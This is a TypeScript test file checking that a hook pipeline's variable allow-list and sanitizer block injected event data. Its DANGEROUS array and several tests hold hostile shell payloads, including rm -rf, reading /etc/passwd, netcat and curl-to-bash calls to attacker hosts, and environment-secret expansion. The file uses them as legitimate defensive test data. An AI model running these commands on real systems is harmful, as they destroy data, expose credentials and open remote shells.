// Security: Hook execution end-to-end injection prevention (RISKS.md R-007)
// Validates that malicious payloads in event data are sanitized through the
// full hook execution pipeline — allow-list → substituteVars → sanitizeHookValue.
// Zero unsafe expansions must reach the ActionExecutor.

import { executeHook, substituteVars, matchesTrigger, runMatchingHooks } from '../../src/hooks/executor';
import { sanitizeHookValue } from '../../src/hardening/sanitize';
import type { Hook, BeadEvent } from '../../src/types/index';

// ── Test infrastructure ───────────────────────────────────────────────────────

function makeEvent(overrides: Partial<BeadEvent> = {}): BeadEvent {
  return {
    type: 'BEAD_RESOLVED',
    beadId: 'bead-safe-001',
    outcome: 'SUCCESS',
    timestamp: '2026-04-10T00:00:00Z',
    role: 'polecat',
    modelId: 'llama-3.1-8b-instant',
    ...overrides,
  };
}

function makeHook(payloadTemplate: Record<string, string>, trigger = 'BEAD_RESOLVED'): Hook {
  return {
    id: 'hook-test-001',
    role: 'historian',
    trigger: { event: trigger },
    action: {
      type: 'MCP_TOOL',
      payload: {
        tool: 'historian_append',
        args: payloadTemplate,
      },
    },
    enabled: true,
    priority: 0,
  };
}

// ── substituteVars allow-list enforcement ─────────────────────────────────────

describe('substituteVars allow-list (R-007)', () => {
  it('substitutes only allow-listed variables', () => {
    const event = makeEvent({ beadId: 'safe-id', outcome: 'SUCCESS' });
    const result = substituteVars('{{event.beadId}} / {{event.outcome}}', event);
    expect(result).toBe('safe-id / SUCCESS');
  });

  it('blocks non-allow-listed paths (returns original placeholder)', () => {
    const event = makeEvent();
    // event.error is not in the allow-list (would be event.error)
    const result = substituteVars('{{event.adminKey}}', event);
    expect(result).toBe('{{event.adminKey}}'); // not substituted
  });

  it('blocks double-dot paths (path traversal attempt)', () => {
    const event = makeEvent();
    const result = substituteVars('{{event..constructor.constructor}}', event);
    expect(result).toBe('{{event..constructor.constructor}}');
  });

  it('blocks __proto__ injection attempt', () => {
    const event = makeEvent();
    const result = substituteVars('{{event.__proto__.polluted}}', event);
    expect(result).toBe('{{event.__proto__.polluted}}');
  });

  it('substitutes all five allowed paths correctly', () => {
    const event = makeEvent({
      beadId: 'b1',
      outcome: 'FAILURE',
      timestamp: '2026-01-01T00:00:00Z',
      role: 'witness',
      modelId: 'qwen3-32b',
    });
    expect(substituteVars('{{event.beadId}}', event)).toBe('b1');
    expect(substituteVars('{{event.outcome}}', event)).toBe('FAILURE');
    expect(substituteVars('{{event.timestamp}}', event)).toBe('2026-01-01T00:00:00Z');
    expect(substituteVars('{{event.role}}', event)).toBe('witness');
    expect(substituteVars('{{event.modelId}}', event)).toBe('qwen3-32b');
  });
});

// ── sanitizeHookValue blocking (end-to-end reach) ─────────────────────────────

describe('sanitizeHookValue blocks dangerous patterns (R-007)', () => {
  const DANGEROUS = [
    '; rm -rf /',
    '$(cat /etc/passwd)',
    '`whoami`',
    '| nc attacker.com 4444',
    '&& curl http://evil.com/shell.sh | bash',
    '|| echo injected',
    '${process.env.SECRET}',
    '\x00null-byte',
    '\nCONTENT-TYPE: text/html',
  ];

  for (const payload of DANGEROUS) {
    it(`blocks: ${payload.slice(0, 40)}`, () => {
      const result = sanitizeHookValue(payload);
      expect(result).toBeNull();
    });
  }

  it('allows clean event values through', () => {
    expect(sanitizeHookValue('bead-abc-123')).toBe('bead-abc-123');
    expect(sanitizeHookValue('SUCCESS')).toBe('SUCCESS');
    expect(sanitizeHookValue('2026-04-10T00:00:00Z')).toBe('2026-04-10T00:00:00Z');
    expect(sanitizeHookValue('llama-3.1-8b-instant')).toBe('llama-3.1-8b-instant');
  });
});

// ── Full pipeline: executeHook with injected event data ───────────────────────

describe('executeHook end-to-end injection prevention (R-007)', () => {
  it('blocked value in substituted payload becomes empty string in executor', async () => {
    const capturedPayloads: Record<string, unknown>[] = [];

    const hook = makeHook({
      beadId: '{{event.beadId}}',
      note: 'safe note',
    });

    // Attacker controls beadId via a poisoned event
    // (In practice, beadId is internal — but we verify the pipeline blocks injection anyway)
    const event = makeEvent({ beadId: '; rm -rf /' });

    await executeHook(hook, event, async (action, _event) => {
      capturedPayloads.push(action.payload);
    });

    const payload = capturedPayloads[0] as { args: { beadId: string } };
    // The injected shell command must be sanitized away (empty string)
    expect(payload.args.beadId).toBe('');
  });

  it('clean values pass through pipeline unchanged', async () => {
    const capturedPayloads: Record<string, unknown>[] = [];

    const hook = makeHook({
      beadId: '{{event.beadId}}',
      outcome: '{{event.outcome}}',
      model: '{{event.modelId}}',
    });

    const event = makeEvent({
      beadId: 'bead-clean-001',
      outcome: 'SUCCESS',
      modelId: 'llama-3.1-8b-instant',
    });

    await executeHook(hook, event, async (action) => {
      capturedPayloads.push(action.payload);
    });

    const payload = capturedPayloads[0] as { args: { beadId: string; outcome: string; model: string } };
    expect(payload.args.beadId).toBe('bead-clean-001');
    expect(payload.args.outcome).toBe('SUCCESS');
    expect(payload.args.model).toBe('llama-3.1-8b-instant');
  });

  it('disabled hook does not execute — even with injected data', async () => {
    const executed: boolean[] = [];
    const hook: Hook = { ...makeHook({ x: '{{event.beadId}}' }), enabled: false };
    const event = makeEvent({ beadId: '$(malicious command)' });

    await executeHook(hook, event, async () => { executed.push(true); });

    expect(executed).toHaveLength(0);
  });

  it('executeHook propagates executor errors to caller (re-throws)', async () => {
    const hook = makeHook({ x: 'val' });
    const event = makeEvent();

    // executeHook has no try/catch — executor errors propagate up
    // runMatchingHooks wraps executeHook in try/catch (swallows per-hook)
    await expect(
      executeHook(hook, event, async () => { throw new Error('executor failure'); }),
    ).rejects.toThrow('executor failure');
  });

  it('runMatchingHooks swallows individual hook errors and continues', async () => {
    const processed: string[] = [];

    const hooks: Hook[] = [
      { ...makeHook({ x: 'v' }), id: 'hook-fail', priority: 10 },
      { ...makeHook({ x: 'v' }), id: 'hook-ok', priority: 5 },
    ];

    const event = makeEvent();
    let callCount = 0;

    await runMatchingHooks(hooks, event, async (action) => {
      callCount++;
      if (callCount === 1) throw new Error('first hook fails');
      // payload structure: { tool: 'historian_append', args: { x: 'v' } }
      const args = (action.payload as { args: Record<string, string> }).args;
      processed.push(args['x']);
    });

    // Second hook must still execute despite first hook's error
    expect(processed).toContain('v');
  });
});

// ── matchesTrigger filter guard ───────────────────────────────────────────────

describe('matchesTrigger filter precision (R-007)', () => {
  it('wildcard event matches any event type', () => {
    const hook = makeHook({}, '*');
    expect(matchesTrigger(hook, makeEvent({ type: 'BEAD_RESOLVED' }))).toBe(true);
    expect(matchesTrigger(hook, makeEvent({ type: 'BEAD_STARTED' as 'BEAD_RESOLVED' }))).toBe(true);
  });

  it('specific trigger does not match wrong event type', () => {
    const hook = makeHook({}, 'BEAD_BLOCKED');
    expect(matchesTrigger(hook, makeEvent({ type: 'BEAD_RESOLVED' }))).toBe(false);
  });

  it('outcomeType filter blocks wrong outcome', () => {
    const hook: Hook = {
      ...makeHook({}),
      trigger: { event: 'BEAD_RESOLVED', filter: { outcomeType: 'FAILURE' } },
    };
    expect(matchesTrigger(hook, makeEvent({ outcome: 'SUCCESS' }))).toBe(false);
    expect(matchesTrigger(hook, makeEvent({ outcome: 'FAILURE' }))).toBe(true);
  });

  it('role filter blocks wrong role', () => {
    const hook: Hook = {
      ...makeHook({}),
      trigger: { event: 'BEAD_RESOLVED', filter: { role: 'witness' } },
    };
    expect(matchesTrigger(hook, makeEvent({ role: 'polecat' }))).toBe(false);
    expect(matchesTrigger(hook, makeEvent({ role: 'witness' }))).toBe(true);
  });
});
